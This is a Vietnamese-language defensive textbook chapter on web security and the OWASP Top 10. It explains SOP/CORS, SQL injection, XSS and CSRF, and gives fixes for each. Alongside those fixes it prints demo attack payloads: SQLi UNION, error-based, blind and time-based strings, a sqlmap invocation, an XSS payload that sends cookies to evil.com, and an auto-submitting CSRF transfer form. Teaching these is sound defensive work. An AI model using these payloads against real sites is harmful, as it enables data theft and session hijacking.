# Chương 5 — An ninh ứng dụng Web (OWASP Top 10)

## Tổng quan

An ninh ứng dụng web là tập hợp các kỹ thuật bảo vệ website, API và ứng dụng chạy trên trình duyệt khỏi bị lạm dụng. Trình duyệt đồng thời thực thi mã từ nhiều nguồn không tin cậy lẫn nhau, còn máy chủ thì nhận dữ liệu từ mọi phía của Internet; chỉ một khe hở nhỏ cũng đủ để kẻ tấn công đọc trộm dữ liệu, mạo danh người dùng hoặc chiếm quyền máy chủ. Vì gần như mọi hệ thống hiện đại đều phơi bày bề mặt web, đây là trục cốt lõi của an toàn thông tin ứng dụng. Chương này đi từ mô hình bảo mật nền tảng của web tới từng nhóm lỗ hổng cụ thể, kèm cơ chế và biện pháp phòng thủ.

**Mô hình bảo mật của Web (Origin, SOP, CORS).** **Origin** (nguồn gốc) là bộ ba `(scheme, host, port)` — đơn vị tin cậy nhỏ nhất mà server kiểm soát được. **Same-Origin Policy (SOP)** giới hạn mã của origin A đọc dữ liệu thuộc origin B; điểm mấu chốt: SOP chặn việc *đọc* kết quả chứ không chặn việc *gửi* request — kẽ hở mà CSRF khai thác. **CORS (Cross-Origin Resource Sharing)** là cơ chế server chủ động opt-in cho origin khác đọc response của mình thông qua các header `Access-Control-*`, nới lỏng SOP một cách có kiểm soát.

**OWASP Top 10.** Danh sách 10 nhóm rủi ro bảo mật ứng dụng web phổ biến và nghiêm trọng nhất, xếp hạng từ dữ liệu thực tế (tần suất phát hiện, mức khai thác, tác động). Đây là lộ trình ưu tiên để che phủ phần lớn rủi ro phổ biến, không phải danh mục đầy đủ mọi mối đe dọa.

**Nhóm tấn công tiêm (Injection: SQLi, XSS, Command, SSTI).** Chung một gốc rễ: **lẫn lộn kênh dữ liệu với kênh điều khiển (code)** (chi tiết ở 5.3, 5.4, 5.8, 5.9).

- **SQL Injection (SQLi)** — dữ liệu người dùng được ghép vào câu lệnh SQL, cho phép thay đổi cấu trúc truy vấn và truy xuất dữ liệu ngoài ý muốn.
- **Cross-Site Scripting (XSS)** — mã JavaScript được tiêm và thực thi trong trình duyệt nạn nhân, dưới origin của trang nạn nhân, dẫn tới trộm phiên hoặc hành động thay người dùng.
- **Command Injection** — input độc hại biến thành lệnh hệ điều hành chạy trên máy chủ.
- **Server-Side Template Injection (SSTI)** — input được template engine biên dịch như mã template, thường dẫn tới RCE.

Biện pháp phòng thủ chung: tách bạch dữ liệu khỏi lệnh — tham số hóa truy vấn, mã hóa đầu ra (output encoding) theo đúng ngữ cảnh, không gọi shell.

**Cross-Site Request Forgery (CSRF).** Lợi dụng việc trình duyệt tự động đính kèm cookie phiên vào mọi request tới một origin. Kẻ tấn công dụ nạn nhân (đang đăng nhập) kích hoạt một request gây tác động mà không cần biết mật khẩu — chỉ cần *gửi* được request có hiệu lực.

**Server-Side Request Forgery (SSRF).** Ép máy chủ gửi request tới đích do kẻ tấn công chọn. Vì server thường nằm trong vùng mạng tin cậy, nó bị dùng làm proxy để chạm tới dịch vụ nội bộ hoặc metadata cloud — ví dụ kinh điển là moi credential từ endpoint metadata của instance.

**Broken Access Control & IDOR.** **Broken Access Control** là việc ứng dụng không thực thi đúng giới hạn "ai được làm gì". **IDOR (Insecure Direct Object Reference)** là biến thể: tham chiếu trực tiếp tới đối tượng qua ID mà không kiểm tra quyền sở hữu (đổi `/invoices/1001` thành `1002` để xem dữ liệu người khác). Đây là nhóm rủi ro đứng đầu OWASP Top 10 2021 (A01).

**Insecure Deserialization & XXE.**

- **Insecure Deserialization** — khôi phục object từ byte stream không tin cậy bằng cơ chế cho phép tái tạo kiểu/gọi method tùy ý, cho phép dựng gadget chain dẫn tới RCE.
- **XML External Entity (XXE)** — parser XML cho phép định nghĩa entity trỏ tới tài nguyên ngoài; kẻ tấn công đọc file nội bộ (`/etc/passwd`) hoặc gây SSRF.

**Upload file an toàn.** Cho phép upload nhưng phải chặn web shell và các kỹ thuật né. Các lớp kiểm tra: allowlist loại file, xác thực magic bytes (không tin phần mở rộng hay Content-Type của client), đổi tên file ngẫu nhiên, lưu ngoài web root tại thư mục không cho thực thi.

**Input Validation vs Output Encoding.** Hai biện pháp khác nhau, bổ sung cho nhau. **Input Validation** kiểm dữ liệu lúc nhận vào theo kỳ vọng nghiệp vụ (allowlist định dạng/kiểu/dải). **Output Encoding** vô hiệu hóa ký tự đặc biệt lúc đưa dữ liệu ra một interpreter (HTML/JS/SQL/URL). Một dữ liệu hợp lệ về nghiệp vụ vẫn có thể phá vỡ một interpreter khác, nên cần cả hai.

**Authentication (Session, JWT, OAuth2/OIDC, SAML, MFA).** Quá trình chứng minh danh tính.

- **Session cookie** — mô hình stateful: server lưu phiên, client giữ session ID trong cookie.
- **JWT (JSON Web Token)** — token tự chứa, có chữ ký chống sửa, cho phép xác thực stateless; dùng sai (chấp nhận `alg:none`, không cố định thuật toán) gây rủi ro nghiêm trọng.
- **OAuth2 / OIDC** — OAuth2 ủy quyền cho ứng dụng truy cập thay người dùng mà không lộ mật khẩu; OIDC là lớp danh tính dựng trên OAuth2 (trả `id_token`).
- **SAML** — SSO doanh nghiệp dựa trên XML (assertion ký XML-DSig).
- **MFA / TOTP** — xác thực nhiều lớp; TOTP sinh mã 6 số đổi mỗi 30 giây, giảm rủi ro khi mật khẩu bị lộ.

**Authorization: RBAC vs ABAC.** Sau xác thực là phân quyền — quyết định "được làm gì". **RBAC** gán quyền theo vai trò (đơn giản, dễ audit). **ABAC** quyết định theo thuộc tính và ngữ cảnh (linh hoạt hơn, phức tạp hơn).

**Security Headers.** Các header response chỉ dẫn trình duyệt cư xử an toàn hơn: ép HTTPS (HSTS), chống clickjacking (`frame-ancestors`/`X-Frame-Options`), cấm đoán MIME (`X-Content-Type-Options: nosniff`). Chi phí cấu hình thấp, chặn được cả lớp tấn công phổ biến.

**Threat Modeling (STRIDE).** Phân tích mối đe dọa từ giai đoạn thiết kế. **STRIDE** liệt kê 6 nhóm đe dọa: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Quy trình: vẽ sơ đồ luồng dữ liệu (DFD), đánh dấu các **trust boundary** (nơi mức tin cậy thay đổi), rồi áp STRIDE cho từng flow cắt qua boundary. Phòng từ khâu thiết kế rẻ hơn vá lỗi về sau.

**Zero Trust.** Mô hình bỏ giả định tin cậy theo vị trí mạng — khẩu hiệu *never trust, always verify*. Mỗi truy cập tới mỗi resource đều được xác thực và phân quyền lại theo ngữ cảnh, thay cho mô hình "trong tường rào là an toàn".

**Logging & Monitoring.** Ghi log và giám sát là nền tảng phát hiện và điều tra tấn công: ghi lại ai làm gì, khi nào, kết quả ra sao, và phát cảnh báo khi có dấu hiệu bất thường. Thiếu log khiến tấn công không bị phát hiện và không thể điều tra hậu kỳ.

> Tài liệu tham chiếu chuyên sâu dành cho kỹ sư bảo mật (Blue Team / AppSec / DevSecOps). Mỗi mục đi từ *là gì → cơ chế bên trong (tới mức bit/byte/bước/tham số) → ví dụ thực tế → lưu ý bảo mật*. Các con số kỹ thuật bám theo RFC/spec; nơi nào cần kiểm chứng phiên bản cụ thể đều được ghi chú rõ.

---

## 5.1. Mô hình bảo mật của Web

### 5.1.1. Bối cảnh: trình duyệt là một sandbox đa nguồn gốc

Trình duyệt hiện đại đồng thời chạy mã (HTML/CSS/JavaScript) đến từ rất nhiều nguồn không tin cậy lẫn nhau trong cùng một tiến trình người dùng. Toàn bộ mô hình bảo mật web được xây dựng quanh một câu hỏi nền tảng: *"Mã từ origin A có được phép đọc/ghi dữ liệu thuộc origin B không?"*. Nếu không có ranh giới, một quảng cáo độc hại nhúng trong trang báo có thể đọc cookie phiên ngân hàng của bạn.

Khái niệm trung tâm là **origin** (nguồn gốc — RFC 6454). Một origin được định nghĩa bởi bộ ba (tuple):

```
origin = (scheme, host, port)
```

| Trường | Ví dụ | Ghi chú |
|--------|-------|---------|
| scheme | `https` | Phân biệt `http` và `https` là HAI origin khác nhau |
| host   | `app.example.com` | So khớp chính xác chuỗi; `example.com` ≠ `www.example.com` |
| port   | `443` | Cổng mặc định ngầm định theo scheme (http=80, https=443) |

Hai URL cùng origin **chỉ khi cả ba thành phần trùng khớp tuyệt đối**:

```
https://app.example.com:443/page1   ┐
https://app.example.com/page2       ┘ → CÙNG origin (443 là mặc định của https)

https://app.example.com   vs  http://app.example.com     → KHÁC (scheme)
https://app.example.com   vs  https://api.example.com    → KHÁC (host)
https://app.example.com   vs  https://app.example.com:8443 → KHÁC (port)
```

**Vì sao thiết kế theo tuple?** Vì đơn vị tin cậy nhỏ nhất mà server có thể tự kiểm soát chính là origin. Một server tại `https://app.example.com:443` toàn quyền quyết định nội dung trả về cho origin đó; nó không thể đảm bảo cho nội dung ở port khác hay host khác.

### 5.1.2. Same-Origin Policy (SOP)

**Là gì:** SOP là chính sách mặc định: script chạy trong ngữ cảnh của origin A bị giới hạn khả năng tương tác với tài nguyên thuộc origin B. SOP không phải một cơ chế đơn lẻ mà là một họ ràng buộc áp dụng khác nhau cho từng loại tài nguyên.

**Cơ chế — SOP áp dụng khác nhau theo loại truy cập:**

| Loại truy cập | SOP áp dụng thế nào | Ví dụ |
|---------------|---------------------|-------|
| `XMLHttpRequest` / `fetch()` đọc response | Bị chặn ĐỌC nếu khác origin (trừ khi CORS cho phép) | `fetch('https://api.other.com')` gửi được nhưng không đọc được response |
| DOM của iframe khác origin | Không đọc/ghi được `iframe.contentWindow.document` | Chống đọc trộm nội dung trang khác |
| Cookie / `localStorage` | `localStorage` phân vùng theo origin; cookie theo domain (khác biệt nhỏ) | Mỗi origin có kho `localStorage` riêng |
| Nhúng tài nguyên tĩnh | KHÔNG bị chặn GỬI, chỉ chặn ĐỌC | `<img src=...>`, `<script src=...>`, `<link>` từ origin khác vẫn tải |

Điểm tinh tế và là gốc của nhiều lỗ hổng: **SOP chặn việc ĐỌC kết quả, không chặn việc GỬI request**. Trình duyệt vẫn gửi request cross-origin (kèm cookie nếu cấu hình cho phép), server vẫn xử lý — chỉ là JavaScript của trang tấn công không đọc được response. Đây chính là kẽ hở mà **CSRF** khai thác (gửi được là đủ để gây tác động), và là lý do **CORS** phải tồn tại (để nới lỏng phần ĐỌC một cách có kiểm soát).

```
Trang tại  https://evil.com  thực thi:
  fetch('https://bank.com/transfer?to=evil&amt=1000', {credentials:'include'})

  ┌─────────────┐   request (KÈM cookie bank.com)   ┌──────────┐
  │  evil.com   │ ────────────────────────────────► │ bank.com │
  │  (JS)       │                                    │  server  │
  │             │ ◄──X── response BỊ SOP chặn đọc ── │          │
  └─────────────┘                                    └──────────┘
       ↑ JS không đọc được body, NHƯNG server ĐÃ xử lý chuyển tiền → CSRF
```

### 5.1.3. CORS — Cross-Origin Resource Sharing (WHATWG Fetch Standard)

**Là gì:** CORS là cơ chế cho phép server **chủ động opt-in** để một origin khác được đọc response của nó. Server tuyên bố qua các header `Access-Control-*`; trình duyệt là bên thực thi quyết định.

**Phân loại request — đây là điểm cốt lõi:**

CORS chia request thành hai nhóm:

1. **Simple request** (request đơn giản): không kích hoạt preflight. Điều kiện (TẤT CẢ phải thỏa):
   - Method ∈ {`GET`, `HEAD`, `POST`}
   - Chỉ dùng các header "an toàn theo CORS" (CORS-safelisted): `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
   - `Content-Type` ∈ {`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`}
   - Không có event listener trên `XMLHttpRequest.upload`, không dùng `ReadableStream`

2. **Preflighted request**: bất kỳ request nào không thỏa điều kiện trên (ví dụ `PUT`, `DELETE`, hoặc `Content-Type: application/json`, hoặc header tùy biến như `X-Api-Key`...) sẽ kích hoạt một request **OPTIONS** đi trước để "xin phép".

**Vì sao cần preflight?** Để bảo vệ các server cũ chưa biết đến CORS. Một request `DELETE` cross-origin có thể gây tác động phá hoại. Preflight đảm bảo server *biết về CORS và đồng ý* trước khi request thật được gửi. Các "simple request" không cần preflight vì chúng vốn đã có thể tạo được bằng HTML thuần (form, img) từ trước khi CORS ra đời — không nới rộng bề mặt tấn công.

**Cơ chế preflight — từng bước, raw:**

Bước 1: Trình duyệt gửi preflight `OPTIONS`:

```http
OPTIONS /api/orders/42 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, content-type
```

| Header (request) | Ý nghĩa |
|------------------|---------|
| `Origin` | Origin của trang gọi (trình duyệt tự gắn, JS không sửa được) |
| `Access-Control-Request-Method` | Method của request THẬT sắp gửi |
| `Access-Control-Request-Headers` | Danh sách header (viết thường, phân tách dấu phẩy) request thật sẽ dùng |

Bước 2: Server trả lời preflight:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
Vary: Origin
```

| Header (response) | Định dạng | Ý nghĩa | Lưu ý bảo mật |
|-------------------|-----------|---------|----------------|
| `Access-Control-Allow-Origin` | chuỗi origin đơn HOẶC `*` | Origin được phép đọc response | **`*` KHÔNG dùng được cùng `credentials:include`** |
| `Access-Control-Allow-Methods` | danh sách method | Method được phép | |
| `Access-Control-Allow-Headers` | danh sách header | Header được phép gửi | |
| `Access-Control-Allow-Credentials` | `true` (hoặc vắng) | Cho phép gửi cookie/HTTP-auth | Nếu `true` thì `Allow-Origin` phải là origin cụ thể, không `*` |
| `Access-Control-Max-Age` | giây | Trình duyệt cache kết quả preflight bao lâu | Giảm số preflight |
| `Vary: Origin` | | Báo cache trung gian rằng response phụ thuộc `Origin` | **Bắt buộc nếu echo Origin động**, tránh cache poisoning |

Bước 3: Nếu preflight pass, trình duyệt gửi request thật:

```http
DELETE /api/orders/42 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Authorization: Bearer eyJhbGci...
Content-Type: application/json
```

Response thật cũng phải lặp lại `Access-Control-Allow-Origin` (và `Allow-Credentials` nếu có), nếu không trình duyệt vẫn chặn việc đọc.

**Lưu ý bảo mật — cấu hình CORS sai phổ biến:**

```javascript
// ❌ SAI NGHIÊM TRỌNG: echo nguyên Origin + cho phép credentials
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // echo bất kỳ origin
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
// → Bất kỳ trang nào cũng đọc được response KÈM cookie nạn nhân.
```

```javascript
// ✅ ĐÚNG: allowlist tường minh
const ALLOW = new Set(['https://app.example.com', 'https://admin.example.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOW.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Vary', 'Origin');
  }
  next();
});
```

Cạm bẫy thường gặp: regex sai như `origin.endsWith('example.com')` sẽ khớp cả `evil-example.com` và `example.com.evil.com`. Phải so khớp tuyệt đối từng origin trong allowlist.

---

## 5.2. OWASP Top 10 (2021) — Tổng quan

OWASP Top 10 2021 là danh sách 10 nhóm rủi ro bảo mật ứng dụng web phổ biến và nghiêm trọng nhất, xếp hạng dựa trên dữ liệu thực tế (tần suất phát hiện, mức khai thác, tác động). Đây là phiên bản hiện hành tại thời điểm tài liệu (cần kiểm chứng nếu OWASP phát hành phiên bản mới hơn).

Sơ đồ dưới đây bám theo đường đi của một request qua các tầng điển hình và đánh dấu nơi từng nhóm lỗ hổng phát sinh:

```
   Client/Browser        WAF / Reverse Proxy        Application                Data layer
  ┌──────────────┐      ┌──────────────────┐     ┌────────────────────┐     ┌──────────────┐
  │ JS, DOM,     │─req─►│ lọc chữ ký tấn    │─►   │ routing, auth,     │─►   │ DB / OS /    │
  │ cookie       │      │ công, rate limit  │     │ business logic     │     │ template /   │
  │              │◄resp─│ thêm sec headers  │◄─   │ render output      │◄─   │ XML / cloud  │
  └──────────────┘      └──────────────────┘     └────────────────────┘     └──────────────┘
        ▲                       ▲                          ▲                        ▲
   XSS (A03),            Misconfig (A05):           Broken Access            SQLi/Command/
   CSRF (A01)            header thiếu,              Control & IDOR (A01),    SSTI (A03),
   chạy ở origin         WAF bypass                 Auth Failures (A07),     XXE (A05),
   nạn nhân                                         SSRF (A10), Deserial.    Crypto Fail (A02)
                                                    (A08)
```

WAF chỉ là lớp lọc ngoài (defense in depth), không thay thế việc vá lỗi tại tầng ứng dụng và dữ liệu — phần lớn lỗ hổng nghiêm trọng nằm sâu bên trong, nơi WAF không thấy được ngữ cảnh.

| Mã | Tên | Trọng tâm |
|----|-----|-----------|
| A01 | Broken Access Control | Vượt quyền, IDOR, thiếu kiểm tra phân quyền |
| A02 | Cryptographic Failures | Lưu/truyền dữ liệu nhạy cảm không mã hóa, thuật toán yếu |
| A03 | Injection | SQLi, Command Injection, XSS (XSS được gộp vào A03 từ 2021) |
| A04 | Insecure Design | Lỗi ở tầng thiết kế, thiếu threat modeling |
| A05 | Security Misconfiguration | Cấu hình mặc định, header thiếu, dịch vụ thừa (XXE gộp vào đây) |
| A06 | Vulnerable and Outdated Components | Thư viện/phụ thuộc có CVE |
| A07 | Identification and Authentication Failures | Xác thực yếu, session kém |
| A08 | Software and Data Integrity Failures | Insecure deserialization, CI/CD bị nhiễm, update không ký |
| A09 | Security Logging and Monitoring Failures | Thiếu log, không phát hiện tấn công |
| A10 | Server-Side Request Forgery (SSRF) | Server bị ép gửi request thay attacker |

Lưu ý mapping: **XSS** chuyển vào A03 (Injection), **XXE** vào A05 (Misconfiguration), **SSRF** được tách riêng thành A10 do cộng đồng đề cử. Các phần dưới trình bày theo *lỗ hổng kỹ thuật* (dễ tra cứu hơn) và chú thích mã A0x tương ứng.

---

## 5.3. A03 — Injection: SQL Injection (SQLi)

**Là gì:** SQLi xảy ra khi dữ liệu do người dùng cung cấp được ghép trực tiếp vào câu lệnh SQL, khiến attacker thay đổi cấu trúc câu truy vấn thay vì chỉ cung cấp dữ liệu. Gốc rễ: **trộn lẫn kênh dữ liệu (data) và kênh điều khiển (code)**.

### 5.3.1. Cơ chế gốc

Code dễ tổn thương:

```python
# ❌ Ghép chuỗi
query = "SELECT id, email FROM users WHERE name = '" + name + "' AND active = 1"
cursor.execute(query)
```

Nếu `name = ' OR '1'='1` thì câu lệnh trở thành:

```sql
SELECT id, email FROM users WHERE name = '' OR '1'='1' AND active = 1
```

Parser SQL không phân biệt được phần nào là "dữ liệu" mà người lập trình định gửi — toàn bộ chuỗi được biên dịch lại thành một cây cú pháp (AST) mới. `'1'='1'` luôn đúng → trả về toàn bộ bảng.

### 5.3.2. Các kỹ thuật khai thác (từng loại, payload cụ thể)

`[DEMO]` Các payload dưới đây chỉ minh hoạ cơ chế khai thác, KHÔNG dùng thẳng production.

**(a) UNION-based** — dùng khi response hiển thị dữ liệu truy vấn.

`UNION SELECT` ghép thêm một tập kết quả. Yêu cầu: cùng số cột và kiểu tương thích. Bước 1, dò số cột bằng `ORDER BY` tăng dần đến khi lỗi:

```
name=foo' ORDER BY 1-- -     → OK
name=foo' ORDER BY 2-- -     → OK
name=foo' ORDER BY 3-- -     → ERROR  ⇒ có 2 cột
```

`-- -` là comment SQL (hai gạch + khoảng trắng) để vô hiệu hóa phần còn lại; thêm `-` cuối tránh bị trim. Bước 2, rút dữ liệu:

```
name=foo' UNION SELECT username, password FROM users-- -
```

**(b) Error-based** — ép DBMS nhả dữ liệu qua thông báo lỗi (ví dụ MySQL):

```
name=foo' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
```

`0x7e` là ký tự `~`; `extractvalue` báo lỗi XPath chứa chuỗi truy vấn → dữ liệu lộ trong message.

**(c) Boolean-based blind** — không có output trực tiếp, suy ra qua TRUE/FALSE (trang phản hồi khác nhau):

```
id=5 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

Nếu trang "có sản phẩm" ⇒ ký tự đầu là `a`. Lặp qua từng vị trí, từng ký tự (thường binary search trên mã ASCII) để rút từng byte.

**(d) Time-based blind** — không có cả khác biệt hiển thị, suy ra qua độ trễ:

```
id=5; IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -
-- MySQL: SLEEP(5) ; PostgreSQL: pg_sleep(5) ; MSSQL: WAITFOR DELAY '0:0:5'
```

Nếu response trễ ~5 giây ⇒ điều kiện đúng. Chậm nhưng hoạt động cả khi không có phản hồi nào quan sát được.

**Request/response raw minh họa (boolean blind):**

```http
GET /product?id=5%20AND%201=1 HTTP/1.1
Host: shop.example.com
```
```http
HTTP/1.1 200 OK
... <div class="product">Áo thun</div> ...   ← TRUE: hiển thị sản phẩm
```
```http
GET /product?id=5%20AND%201=2 HTTP/1.1
```
```http
HTTP/1.1 200 OK
... <div class="empty">Không tìm thấy</div> ... ← FALSE: trang khác
```

### 5.3.3. Công cụ thực tế: sqlmap

```bash
# Tự động phát hiện và khai thác SQLi trên 1 tham số
sqlmap -u "https://shop.example.com/product?id=5" \
       --batch \                    # không hỏi tương tác, dùng mặc định
       --level=3 --risk=2 \         # mức độ thử nghiệm (1-5 / 1-3)
       --dbms=mysql \               # ép kiểu DBMS để giảm noise
       --technique=BEUST \          # B=boolean E=error U=union S=stacked T=time
       --dbs                        # liệt kê các database
```

Output mẫu:

```
[INFO] testing connection to the target URL
[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable
[INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 2 columns' injectable
available databases [2]:
[*] information_schema
[*] shop
```

Giải thích tham số: `--level` tăng số vị trí tiêm (header, cookie...); `--risk` cho phép payload nặng hơn (có thể OR-based gây thay đổi dữ liệu). Trong Blue Team, chữ ký request của sqlmap (User-Agent `sqlmap/`, chuỗi `AND 1=1`, `ORDER BY n`, `SLEEP(`) là chỉ dấu nhận diện qua WAF/log.

### 5.3.4. Phòng thủ: Prepared Statements (Parameterized Queries)

**Cơ chế gốc của fix:** prepared statement tách BIÊN DỊCH câu lệnh khỏi việc TRUYỀN dữ liệu. Server DB biên dịch khung câu lệnh với placeholder `?` trước; dữ liệu gửi sau qua một kênh riêng (binary protocol) và **không bao giờ được parse lại như SQL**. Cấu trúc câu truy vấn cố định — attacker không thể đổi cây cú pháp.

```python
# ✅ Python (DB-API), placeholder do driver xử lý
cursor.execute(
    "SELECT id, email FROM users WHERE name = %s AND active = 1",
    (name,)              # tham số đi kênh riêng
)
```

```java
// ✅ Java JDBC
PreparedStatement ps = conn.prepareStatement(
    "SELECT id, email FROM users WHERE name = ? AND active = 1");
ps.setString(1, name);   // bind tham số, không nối chuỗi
ResultSet rs = ps.executeQuery();
```

Lưu ý: prepared statement KHÔNG tham số hóa được tên bảng/cột hay từ khóa (`ORDER BY <col>`). Với phần đó dùng **allowlist** ánh xạ giá trị người dùng sang tên cột hợp lệ, tuyệt đối không nối chuỗi. ORM (Hibernate, SQLAlchemy, Prisma) dùng đúng cách sẽ tự sinh prepared statement, nhưng `raw query` trong ORM vẫn có thể SQLi nếu nối chuỗi.

---

## 5.4. A03 — Cross-Site Scripting (XSS)

**Là gì:** XSS là việc tiêm mã JavaScript thực thi trong ngữ cảnh trình duyệt nạn nhân, dưới origin của trang nạn nhân. Vì chạy trong origin đó, mã đọc được cookie (không `HttpOnly`), `localStorage`, thực hiện hành động thay người dùng, keylog... Gốc rễ: **dữ liệu không tin cậy được nhúng vào trang mà không encode đúng ngữ cảnh**.

### 5.4.1. Ba loại XSS

| Loại | Nguồn payload | Lưu ở đâu | Đặc điểm |
|------|----------------|-----------|----------|
| **Reflected** | Tham số request (URL, form) | Không lưu — phản chiếu ngay trong response | Cần dụ nạn nhân bấm link độc |
| **Stored** | Dữ liệu lưu trong DB (comment, profile) | Server lưu, phục vụ lại cho mọi người xem | Nguy hiểm nhất, tự lan |
| **DOM-based** | Nguồn client-side (`location.hash`...) | Không qua server | JS client ghi dữ liệu vào DOM không an toàn |

### 5.4.2. Payload và request/response cụ thể

`[DEMO]` Các payload XSS dưới đây chỉ minh hoạ cơ chế, KHÔNG dùng thẳng production.

**Reflected** — endpoint phản chiếu `q`:

```http
GET /search?q=<script>document.location='https://evil.com/c?'+document.cookie</script> HTTP/1.1
```
Response (dễ tổn thương):
```http
HTTP/1.1 200 OK
Content-Type: text/html
...
<p>Kết quả cho: <script>document.location='https://evil.com/c?'+document.cookie</script></p>
```
Trình duyệt parse `<script>` và thực thi → cookie bị gửi sang `evil.com`.

**DOM-based** — không cần server xử lý:

```html
<!-- Trang chứa code dễ tổn thương -->
<script>
  document.getElementById('out').innerHTML = location.hash.substring(1);
</script>
```
URL tấn công:
```
https://app.example.com/page#<img src=x onerror=alert(document.cookie)>
```
`location.hash` (`#...`) **không gửi lên server**, nên WAF phía server không thấy. `innerHTML` parse `<img>`, sự kiện `onerror` chạy khi ảnh lỗi. (Lưu ý: thẻ `<script>` chèn qua `innerHTML` không tự chạy, nên payload DOM-XSS dùng `onerror`/`onload`.)

### 5.4.3. Phòng thủ tầng 1: Output Encoding theo NGỮ CẢNH

Điểm mấu chốt: **encode phải đúng theo ngữ cảnh nơi dữ liệu được chèn**. Cùng một chuỗi cần encode khác nhau:

| Ngữ cảnh chèn | Cần encode gì | Ví dụ |
|---------------|---------------|-------|
| HTML body / text node | `& < > " '` → entity | `<` → `&lt;` |
| HTML attribute (có ngoặc kép) | `" & ` + bao quanh bằng `"` | `"` → `&quot;` |
| JavaScript string | `\xHH` hoặc `\uHHHH`, escape `< / '` | `</script>` → `\x3C\/script\x3E` |
| URL (giá trị query) | percent-encoding | space → `%20` |
| CSS value | escape `\HH ` | |

```
Sai phổ biến: HTML-encode rồi nhét vào ngữ cảnh JS:
  <script>var x = "&lt;b&gt;";</script>   ← vẫn lỗi nếu dữ liệu chứa " hoặc </script>
```

```javascript
// ✅ Dùng template engine auto-escape ĐÚNG ngữ cảnh
// React tự escape khi render {value} vào JSX → an toàn cho HTML context
function Comment({ text }) { return <p>{text}</p>; }  // text được HTML-escape

// ❌ Nhưng dangerouslySetInnerHTML phá bỏ bảo vệ
function Bad({ html }) { return <div dangerouslySetInnerHTML={{__html: html}} />; }
```

Với HTML do người dùng nhập (rich text), không thể chỉ encode — phải **sanitize** bằng allowlist thẻ/thuộc tính:

```javascript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b','i','em','strong','a','p','ul','li'],
  ALLOWED_ATTR: ['href']
});  // loại bỏ <script>, onerror=, javascript: ...
```

### 5.4.4. Phòng thủ tầng 2: Content Security Policy (CSP)

**Là gì:** CSP là một header HTTP khai báo nguồn tài nguyên hợp lệ; trình duyệt từ chối thực thi/tải tài nguyên ngoài chính sách. CSP là **lớp phòng thủ chiều sâu** — giảm thiểu tác động khi encoding bị bỏ sót.

```http
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-r4nd0mB4se64';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

| Directive | Ý nghĩa | Lưu ý |
|-----------|---------|-------|
| `default-src` | Mặc định cho mọi loại tài nguyên | `'self'` = cùng origin |
| `script-src` | Nguồn script hợp lệ | Tránh `'unsafe-inline'`, `'unsafe-eval'` |
| `'nonce-xxx'` | Chỉ script mang `nonce` đúng mới chạy | Nonce phải ngẫu nhiên MỖI response |
| `object-src 'none'` | Chặn `<object>/<embed>` (Flash...) | |
| `base-uri 'self'` | Chặn `<base>` injection đổi URL tương đối | |
| `frame-ancestors` | Ai được nhúng trang này vào iframe | Thay thế `X-Frame-Options` |

Cơ chế nonce: server sinh chuỗi ngẫu nhiên (≥128 bit base64) mỗi lần render, gắn vào cả header CSP và thuộc tính `nonce=` của thẻ `<script>` hợp lệ. Script do attacker tiêm không biết nonce → bị chặn:

```html
<script nonce="r4nd0mB4se64">/* code hợp lệ chạy */</script>
<script>/* XSS tiêm vào, KHÔNG có nonce → bị chặn */</script>
```

**Báo cáo vi phạm** để Blue Team giám sát:

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```
`Report-Only` không chặn, chỉ gửi báo cáo JSON về `/csp-report` — dùng để triển khai dần, dò false positive trước khi enforce.

**Lưu ý bảo mật:** Cookie phiên nên đặt `HttpOnly` để JS (kể cả XSS) không đọc được `document.cookie`. Tuy nhiên XSS vẫn thực hiện được hành động trong phiên (gửi request thay người dùng), nên `HttpOnly` giảm chứ không xóa rủi ro.

---

## 5.5. CSRF — Cross-Site Request Forgery (liên quan A01)

**Là gì:** CSRF lợi dụng việc trình duyệt **tự động đính kèm cookie** vào request tới một origin, bất kể request được khởi tạo từ đâu. Attacker dụ nạn nhân (đang đăng nhập) kích hoạt một request gây tác động tới site nạn nhân. Khác XSS: CSRF không cần đọc response, chỉ cần *gửi* request có hiệu lực.

### 5.5.1. Cơ chế

```html
<!-- Trang evil.com, nạn nhân đang đăng nhập bank.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit();</script>
```
Khi nạn nhân mở trang, form tự submit. Trình duyệt đính kèm cookie phiên `bank.com` → server xử lý như request hợp lệ.

### 5.5.2. Phòng thủ 1: Anti-CSRF Token (Synchronizer Token Pattern)

Server sinh token ngẫu nhiên (≥128 bit), gắn vào form ẩn và lưu phía server (gắn với phiên). Request gây tác động phải kèm token; server so khớp. Vì SOP, `evil.com` **không đọc được** token (nó nằm trong HTML của `bank.com`) → không giả mạo được.

```http
POST /transfer HTTP/1.1
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

to=bob&amount=50&csrf_token=9f8a7b6c5d4e3f2a1b0c...
```
